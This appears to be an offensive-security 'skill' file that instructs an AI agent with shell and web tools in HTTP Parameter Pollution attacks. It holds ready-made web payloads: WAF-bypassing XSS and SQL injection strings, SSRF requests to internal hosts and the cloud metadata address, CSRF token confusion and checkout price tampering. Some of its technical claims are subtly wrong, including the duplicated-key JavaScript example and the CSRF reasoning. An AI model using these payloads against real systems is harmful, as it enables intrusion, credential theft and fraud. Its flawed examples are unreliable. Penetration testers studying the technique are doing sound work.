---
name: http-parameter-pollution
description: HTTP Parameter Pollution — per-server behavior matrix (PHP/ASP.NET/JSP/Python/Node.js/Go/Ruby), WAF bypass via duplicated parameters, SSRF via split URL, CSRF token confusion, business logic (payment amount) abuse, and backend/frontend parameter discrepancy exploitation.
sources: hack_skills, bug_bounty_reports
allowed-tools: Bash Read Write Edit Glob Grep Agent WebFetch WebSearch
---

# SKILL: HTTP Parameter Pollution (HPP) — Expert Playbook

> **AI LOAD INSTRUCTION**: HPP occurs when the same parameter appears multiple times in an HTTP request and the backend/WAF/proxy handle duplicates differently. Covers server-behavior matrix for all major frameworks, WAF bypass, SSRF split, CSRF confusion, and payment logic abuse. Base models often miss the per-framework behavior differences and the WAF bypass use case entirely.

## 0. RELATED ROUTING

- nosql-injection — HPP bracket notation can deliver NoSQL operators ($ne, $gt) in some frameworks
- ssrf-hunter — HPP can split URLs to bypass SSRF filters
- csrf-cross-site-request-forgery — HPP can confuse CSRF token validators

---

## 1. FRAMEWORK BEHAVIOR MATRIX

When `?param=value1&param=value2` is sent:

| Framework / Server | Parameter Handling | Example |
|---|---|---|
| **PHP** | Last value wins | `$_GET['param'] == "value2"` |
| **PHP (via $_POST)** | Last value wins | `$_POST['param'] == "value2"` |
| **ASP.NET / IIS** | First and last comma-joined | `Request.QueryString["param"] == "value1,value2"` |
| **JSP / Java Servlet** | First value wins | `request.getParameter("param") == "value1"` |
| **Python (Flask/Django)** | Last value wins | `request.args.get("param") == "value2"` |
| **Node.js (Express/qs)** | Last value wins (default) | `req.query.param == "value2"` |
| **Node.js (qs)** | Array if repeated | `req.query.param == ["value1","value2"]` |
| **Go (net/http)** | First value wins | `r.URL.Query().Get("param") == "value1"` |
| **Ruby (Rails)** | Last value wins | `params[:param] == "value2"` |
| **Nginx** | Passes all to backend | Backend decides |
| **mod_wsgi (Apache)** | Last value wins | Standard WSGI behavior |
| **Tomcat** | First value wins | Standard Java servlet |

**Key insight**: If the WAF uses a different framework/language than the backend, they may use different values from the same duplicated parameter.

---

## 2. WAF BYPASS VIA HPP

If a WAF checks the first occurrence and the backend uses the last (or vice versa):

```
# WAF sees: param=safe_value → passes
# Backend uses: param=<script>alert(1)</script> → XSS executes
GET /search?q=hello&q=<script>alert(1)</script>

# More subtle:
GET /transfer?amount=1&amount=1000
# Backend processes: amount=1000 (last value PHP/Rails/Flask)
# WAF validated: amount=1 (first value)
```

### Real-World WAF Bypass Pattern

```http
# WAF checks first param, backend uses last:
POST /api/login HTTP/1.1
Content-Type: application/x-www-form-urlencoded

username=admin&password=safe_input&password=' OR '1'='1
```

---

## 3. SSRF VIA HPP (URL SPLITTING)

When a URL is constructed from multiple parameters:

```
App constructs: https://{host}{path}
Request: host=internal&path=.attacker.com
Result: https://internal.attacker.com ← bypasses internal SSRF filter
```

Or with duplicate URL parameters:

```
# Target validates: url=https://allowed.com
# Backend uses last: url=https://evil.com

GET /fetch?url=https://allowed.com&url=https://internal.company.com/admin
```

### SSRF via HPP in Webhook/Redirect Parameters

```
POST /webhook HTTP/1.1
Content-Type: application/x-www-form-urlencoded

callback_url=https://allowed.example.com&callback_url=https://169.254.169.254/latest/meta-data/
```

---

## 4. CSRF TOKEN CONFUSION VIA HPP

```
# Normal request:
POST /transfer?csrf_token=VALID_TOKEN

# HPP attack: inject second csrf_token
POST /transfer HTTP/1.1
Content-Type: application/x-www-form-urlencoded

amount=1000&to=attacker&csrf_token=INVALID&csrf_token=VALID_TOKEN
```

If the CSRF validator uses the first occurrence but the app uses the last:
- Validator: `csrf_token=INVALID` → validation fails (expected bypass)
- **OR** Validator: `csrf_token=VALID_TOKEN` (second) → valid, app processes with INVALID first value → confused state

---

## 5. BUSINESS LOGIC ABUSE — PAYMENT AMOUNT

Classic HPP payment confusion:

```
# Normal purchase: price=100.00
POST /checkout HTTP/1.1

price=100.00&price=1.00
# PHP backend might use first: price=100.00 (validation passes)
# Or last: price=1.00 (payment processed for $1.00)
```

```
# Coupon bypass: apply discount twice
POST /apply-coupon
coupon=DISCOUNT10&coupon=DISCOUNT10
# If coupon is applied for each occurrence: 20% discount
```

---

## 6. BACKEND/FRONTEND PARAMETER DISCREPANCY

When frontend JS sends one parameter set and backend expects another:

```javascript
// Frontend sends:
fetch('/api/update', {
  method: 'POST',
  body: new URLSearchParams({role: 'user', role: 'admin'})
  // URLSearchParams: last value wins in construction
  // But send to server: role=user&role=admin
})

// Backend (PHP) sees: role=admin (last value)
// Frontend only showed 'user' to the developer
```

---

## 7. ARRAY INJECTION VIA HPP

Some frameworks (PHP, Perl, Rails) treat bracket notation as arrays:

```
?id[]=1&id[]=2 → $_GET['id'] = [1, 2]
?id=1&id=2     → $_GET['id'] = "2" (last value)
```

This enables NoSQL operator injection (see nosql-injection skill) in Node.js applications using `qs` library:
```
?password[$ne]=invalid → {password: {$ne: "invalid"}}
```

---

## 8. TESTING METHODOLOGY

### Manual Probe

```bash
# Send duplicate parameters and compare response:
# Original: 
curl "https://target.com/search?q=test"

# HPP:
curl "https://target.com/search?q=test&q=test2"

# Check if response differs from q=test vs q=test2 → reveals which value backend uses
```

### Burp Intruder HPP Test

```
1. Send request to Repeater
2. Duplicate each parameter (add &param2=FUZZ before/after original param)
3. Test with payloads in the second occurrence
4. Compare responses to understand which value backend uses
```

### HPP on JSON Bodies

```json
// Some JSON parsers handle duplicate keys differently:
{"param": "value1", "param": "value2"}
// JavaScript (JSON.parse): last value wins → "value2"
// Some custom parsers: first value wins → "value1"
// Attackers can exploit this discrepancy
```

---

## 9. HPP IN HEADERS

Headers can also be duplicated:

```http
GET / HTTP/1.1
Host: target.com
X-Forwarded-For: 127.0.0.1
X-Forwarded-For: attacker.com

# Some proxies combine: X-Forwarded-For: 127.0.0.1, attacker.com
# Others use last: X-Forwarded-For: attacker.com
# If IP whitelist checks first value and log uses combined → bypass
```

---

## 10. TESTING CHECKLIST

```
□ Identify key parameters: auth tokens, prices, IDs, URLs, roles
□ Duplicate each parameter with safe first / malicious second value
□ Duplicate each parameter with malicious first / safe second value
□ Test bracket notation: param[]=val1&param[]=val2 (PHP array injection)
□ Test HPP on CSRF tokens
□ Test HPP on payment/price fields  
□ Test HPP on role/permission fields
□ Test HPP on URL parameters used for fetching/redirecting
□ Check if WAF and backend handle duplicates differently (key bypass technique)
□ Test JSON bodies for duplicate key behavior
```
